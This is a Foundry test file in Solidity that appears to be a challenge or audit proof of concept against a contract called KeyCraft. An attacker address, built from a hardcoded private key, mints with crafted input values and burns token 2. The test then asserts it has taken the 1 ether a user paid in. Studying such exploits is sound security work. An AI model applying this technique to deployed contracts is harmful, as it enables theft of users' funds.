// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import {Test} from "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/KeyCraft.sol";

contract KC is Test {
    KeyCraft k;
    address owner;
    address user;
    address attacker;

    function setUp() public {
        owner = makeAddr("owner");
        user = makeAddr("user");
        attacker = vm.addr(0x5e5a515c460a667ce45f9e0949c5c2357250556909304b7c2ee8202a4b2909ac);

        vm.deal(user, 1 ether);

        vm.startPrank(owner);
        k = new KeyCraft("KeyCraft", "KC");
        vm.stopPrank();

        vm.startPrank(user);
        k.mint{value: 1 ether}(hex"dead");
        vm.stopPrank();
    }

    function testKeyCraft() public {
        vm.startPrank(attacker);

        k.mint(abi.encodePacked(uint256(0xf89ae7139a2ecac685ff9161992b9ed1be7ae447883a9b42d533b0f67028298f), uint256(0x2cad20f5d06c1a65b3542e5287da1e2cd7c0fe17aeddd21edf58370c6eb1e07d)));

        k.burn(2);

        vm.stopPrank();
        assertEq(attacker.balance, 1 ether);
    }
}
